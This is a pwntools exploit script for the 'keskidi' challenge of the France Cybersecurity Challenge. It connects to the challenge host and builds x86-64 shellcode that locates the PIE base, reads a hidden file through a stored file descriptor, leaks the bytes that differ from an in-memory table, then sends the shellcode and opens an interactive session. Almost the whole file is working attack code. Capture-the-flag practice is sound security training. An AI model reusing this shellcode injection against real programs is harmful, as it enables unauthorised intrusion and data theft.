#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('keskidi')

host = args.HOST or 'challenges.france-cybersecurity-challenge.fr'
port = int(args.PORT or 2103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript,api=True, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
starti
set disable-randomization on
set follow-fork-mode child
'''.format(**locals())

# -- Exploit goes here --

io = start()

if args.GDB:
    out = io.gdb.execute('vmmap',to_string=True)
    pie_base = int(out.split('0x')[1].split(' ')[0],16)

    io.gdb.execute(f'b *{pie_base + 0x13be}')
    io.gdb.execute('continue')

#sleep(2)

s = f"""
## get pie_base in r12
mov r12, [rsp]
sub r12, 0x13c0

## get tmp_fd in r13
mov r13, [r12+0x4040]

## get start of tab in r14
lea r14, [r12+0x4060]

## get file content in r15
sub rsp, 0x1000
mov r15, rsp
{shellcraft.syscall('SYS_lseek','r13', 0, 0)}
{shellcraft.read('r13', 'rsp', 0X1000)}
mov rcx, r14
mov rdx, r15
mov rdi, 0
xor rax,rax
xor rbx,rbx

loop:
mov al,[rcx] 
mov bl, [rdx]
cmp rax,rbx
jne print
nextiter:
inc rcx
inc rdx
inc rdi
cmp rdi, 0x1000
je end
jmp loop

end: 
nop
jmp end

print:
mov r8,rcx
mov r9,rdx
{shellcraft.write(1,'rcx',1)}
mov rcx,r8
mov rdx,r9
jmp nextiter
"""

s = f"""
## get pie_base in r12
mov r12, [rsp]
sub r12, 0x13c0

## get tmp_fd in r13
mov r13, [r12+0x4040]

## get start of tab in r14
lea r14, [r12+0x4060]

## get file content in r15
sub rsp, 0x1000
mov r15, rsp

get_content:
{shellcraft.syscall('SYS_lseek','r13', 0, 0)}
{shellcraft.read('r13', 'rsp', 0X1000)}
mov rcx, r14
mov rdx, r15
mov rdi, 0
xor rax,rax
xor rbx,rbx

loop:
mov al,[rcx] 
mov bl, [rdx]
cmp rax,rbx
jne print
nextiter:
inc rcx
inc rdx
inc rdi
cmp rdi, 0x1000
je end
jmp loop

end: 
dec rsp
mov al,[rsp]
cmp rax,0
je suite
{shellcraft.write(1,'rsp',1)}
inc rsp
suite:
{shellcraft.syscall('SYS_lseek','r13', 0, 0)}
{shellcraft.write('r13','rsp',0x1000)}
{shellcraft.syscall('SYS_syncfs','r13')}
jmp get_content

print:
mov [rsp-1],al
mov [rdx],al
jmp nextiter
"""

print(s)
shellcode = asm(s)
print(shellcode)

io.send(shellcode)

io.interactive()

